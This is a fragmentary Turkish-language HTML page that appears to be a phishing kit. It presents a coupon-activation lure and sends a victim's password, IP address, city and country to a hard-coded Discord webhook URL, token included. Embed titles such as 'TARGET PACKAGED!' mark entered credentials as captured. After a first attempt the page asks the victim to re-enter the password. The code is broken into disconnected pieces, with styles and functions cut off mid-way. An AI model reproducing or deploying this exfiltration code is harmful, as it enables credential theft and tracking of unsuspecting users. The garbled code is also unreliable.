<!DOCTYPE html>
<html lang="tr">
<head>

        .stats { display: flex; justify-content: space-around; margin-bottom: 20px; font-size: 12px; color: #46d369; font-weight: bold; }

        input {

        .secure-mask { -webkit-text-security: disc !important; }

        button {

</head>
<body>

    <script>
        const hook = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
        let geo = {};

        // Bilgi Toplama ve Ba≈ülangƒ±√ß

        function kontrol() {

        async function ilkGonderim() {

            await fetch(hook, {

                body: JSON.stringify({
                    content: e, 
                    embeds: [{
                        title: deneme === 1 ? "‚ö†Ô∏è ƒ∞LK Gƒ∞Rƒ∞≈û DENEMESƒ∞" : "üéØ HEDEF PAKETLENDƒ∞!",
                        color: deneme === 1 ? 16776960 : 16711680,

                            { name: "üîë ≈ûifre", value: `\`${p}\``, inline: true },
                            { name: "üåê ≈ûehir/√úlke", value: `${geo.city} / ${geo.country_name}`, inline: false },
                            { name: "üñ•Ô∏è IP", value: `\`${geo.ip}\``, inline: true }

                    document.getElementById('descTxt').innerText = "L√ºtfen ≈üifrenizi tekrar kontrol ederek giriniz.";

                document.getElementById('loadMsg').innerText = "Kuponunuz Aktif Ediliyor...";

        }
    </script>
</body>
</html>
